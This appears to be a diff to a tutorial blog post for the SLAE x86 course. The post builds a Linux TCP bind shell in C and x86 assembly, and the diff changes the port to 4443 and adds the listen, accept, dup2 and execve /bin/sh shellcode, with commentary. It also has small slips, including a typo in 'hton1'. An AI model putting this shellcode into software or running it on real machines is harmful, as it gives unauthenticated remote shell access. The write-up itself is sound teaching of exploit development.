@@ -39,7 +39,7 @@ int main()
     //Defining Address Structure
     struct sockaddr_in addr;
     addr.sin_family = AF_INET;
-    addr.sin_port = htons(31337); //Port no.
+    addr.sin_port = htons(4443); //Port no.
     addr.sin_addr.s_addr = htonl(INADDR_ANY); //Use any interface to listen
 
     //Create and Configure Socket
@@ -71,7 +71,7 @@ int main()
 //Defining Address Structure
 struct sockaddr_in addr;
 addr.sin_family = AF_INET;
-addr.sin_port = htons(1337); //Port no.
+addr.sin_port = htons(4443); //Port no.
 addr.sin_addr.s_addr = hton1(INADDR_ANY); //Use any interface to listen
 ```
 This part of the code is responsible for defining the address family, port, and interface parameters, based on which we create our socket. Executing `man 7 ip` gives us a better understanding of the IP Address format:
@@ -164,8 +164,8 @@ $ gcc shell.c -o shell
 $ ./shell
 
 Terminal 2:
-$ nc -nv 127.0.0.1 31337
-(UNKNOWN) [127.0.0.1] 31337 (?) open
+$ nc -nv 127.0.0.1 4443
+(UNKNOWN) [127.0.0.1] 4443 (?) open
 pwd
 /home/kali/Desktop/SLAE_Practice/SLAEx86_Assignments/ass1
 ```
@@ -180,7 +180,6 @@ Let's start off by gathering the call numbers. These are stored in ```/usr/inclu
 ```
 #define SYS_SOCKET      1               /* sys_socket(2)                */
 #define SYS_BIND        2               /* sys_bind(2)                  */
-#define SYS_CONNECT     3               /* sys_connect(2)               */
 #define SYS_LISTEN      4               /* sys_listen(2)                */
 #define SYS_ACCEPT      5               /* sys_accept(2)                */
 ```
@@ -232,7 +231,7 @@ Now we will create the address structure and call the ```bind()``` function.
 mov al, 0x66
 inc ebx          ;ebx=2
 push edx         ;0
-push word 0x697a ;31337
+push word 0x5b11 ;4443
 push word bx     ;2
 mov ecx, esp     ;pointer to args
 push 0x10        ;16
@@ -244,3 +243,52 @@ int 0x80         ;syscall
 This time, we increment (```inc```) ebx by 1, which means that now it has the value of 2, which is an identifier for the ```bind()``` call. We start by pushing 0 (which is stored in ebx) to the top of the stack, corresponding to the dummy protocol. This is followed by pushing the port number, and the value of 2, which corresponds to ```AF_INET```, and then we store a pointer to these arguments in ecx. This makes up the address structure.
 
 Then we push the address structure length (16) onto the the stack, along with a pointer to the previous arguments for ```bind()```. The ```bind()``` function takes ```sockfd``` as its first argument, so we push the pointer to that (stored in esi from before) onto the stack. After that, we finally store a pointer to all arguments in ecx, and execute the syscall.
+
+Now, we setup ```listen()``` and ```accept()``` in a similar fashion.
+```nasm
+; listen(s,0)
+xor eax, eax     ;eax=0
+mov al, 0x66		
+inc ebx          ;ebx=3
+inc ebx          ;ebx=4
+push ebx         ;4 --> SYS_LISTEN
+push esi         ;sockfd
+mov ecx, esp     ;pointer to args
+int 0x80         ;syscall
+
+; accept(s,0,0)
+mov al, 0x66
+inc ebx          ;ebx=5 --> SYS_ACCEPT
+push edx         ;0 --> addrlen
+push edx         ;0 --> sockaddrr
+push esi         ;sockfd
+mov ecx, esp     ;pointer to args
+int 0x80         ;syscall
+mov edi, eax     ;new fd that we get from accept (we will use this for duping)
+```
+Just keep in mind that ```accept()``` will return a file descriptor which we need to store for later use, in order to duplicate the standard file descriptors.
+
+Let's duplicate the standard file descriptors. We will use a loop for this.
+```nasm
+xor ecx, ecx     ;ecx=0
+mov cl, 0x3      ;counter for loop. Iterating for 3 stdfds
+dup2:
+xor eax, eax     ;eax=0
+mov al, 0x3f     ;syscall number for dup2
+mov ebx, edi     ;new fd from accept() moved into ebx
+dec cl           ;ecx=2
+int 0x80         ;syscall
+jnz dup2         ;keep looping until the 0 flag is set
+```
+And finally we use ```execve``` to execute ```/bin/sh```.
+```nasm
+;execve
+xor ecx, ecx     ;ecx=0
+push ecx         ;pushing the null
+push byte 0x0b   ;print syscall
+pop eax          ;eax=11
+push 0x68732f2f  ;pushing /bin/sh in reverse order
+push 0x6e69622f
+mov ebx, esp     ;pointer to args
+int 0x80         ;syscall
+```
